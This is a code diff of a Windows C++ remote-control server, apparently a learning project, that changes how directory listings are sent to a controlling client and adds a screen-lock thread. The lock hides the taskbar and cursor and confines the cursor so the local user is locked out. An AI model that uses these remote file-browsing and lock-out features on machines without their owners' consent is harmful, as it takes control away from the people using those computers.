@@ -61,18 +61,7 @@ int MakeDriverInfo()
 #include <io.h>
 #include <list>
 
-typedef struct file_info{
-    file_info() {
-        IsInvalid = FALSE;
-        IsDirectory = FALSE;
-        HasNext = TRUE;
-        memset(szFileName, 0, sizeof(szFileName));
-    }
-    BOOL IsInvalid;//是否有效
-    BOOL IsDirectory;//是否是目录
-    BOOL HasNext;
-    char szFileName[256];//文件名
-}FILEINFO, *PFILEINFO;
+
 
 int MakeDirecteryInfo()
 {
@@ -86,21 +75,26 @@ int MakeDirecteryInfo()
     if (_chdir(strPath.c_str()) != 0)
     {
         FILEINFO finfo;
-        finfo.IsInvalid = TRUE;
-        finfo.IsDirectory = TRUE;
+        /*finfo.IsInvalid = TRUE;
+        finfo.IsDirectory = TRUE;*/
         finfo.HasNext = FALSE;
-        memcpy(finfo.szFileName, strPath.c_str(), strPath.size());
+        //memcpy(finfo.szFileName, strPath.c_str(), strPath.size());
         //lstFileInfos.push_back(finfo);
-        CPacket pack(2, (BYTE*)& finfo, sizeof(finfo));
+        CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
         CServerSocket::getInstance()->Send(pack);
         OutputDebugString(_T("没有访问权限\n"));
         return -2;
     }
     _finddata_t fdata;
-    int hfind = 0;
+    __int64 hfind = 0;
     if ((hfind = _findfirst("*", &fdata)) == -1)
     {
         OutputDebugString(_T("没有找到任何文件\n"));
+        FILEINFO finfo;
+        finfo.HasNext = FALSE;
+        //TRACE("%s\n", finfo.szFileName);
+        CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
+        CServerSocket::getInstance()->Send(pack);
         return -3;
     }
     do
@@ -108,13 +102,15 @@ int MakeDirecteryInfo()
         FILEINFO finfo;
         finfo.IsDirectory = ((fdata.attrib & _A_SUBDIR) != 0);
         memcpy(finfo.szFileName, fdata.name, strlen(fdata.name));
-        //lstFileInfos.push_back(finfo);
+        TRACE("%s\n", finfo.szFileName);
         CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
         CServerSocket::getInstance()->Send(pack);
     } while (!_findnext(hfind, &fdata));
     //发送信息到控制端
     FILEINFO finfo;
     finfo.HasNext = FALSE;
+    CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
+    CServerSocket::getInstance()->Send(pack);
     return 0;
 }
 
@@ -304,11 +300,20 @@ unsigned __stdcall threadLockDlg(void* arg)
 {
     dlg.Create(IDD_DIALOG_INFO, NULL);
     dlg.ShowWindow(SW_SHOW);
+    CRect rect;
+    rect.left = 0;
+    rect.right = GetSystemMetrics(SM_CXFULLSCREEN);
+    rect.top = 0;
+    rect.bottom = GetSystemMetrics(SM_CXFULLSCREEN);
+    rect.bottom = LONG(rect.bottom * 1.03);
+    dlg.MoveWindow(rect);
     dlg.SetWindowPos(&dlg.wndTopMost, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
     ShowCursor(false);
     ::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_HIDE);
-    CRect rect;
-    dlg.GetWindowRect(rect);
+    rect.left = 0;
+    rect.right = 0;
+    rect.top = 1;
+    rect.bottom = 1;
     ClipCursor(rect);
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0))
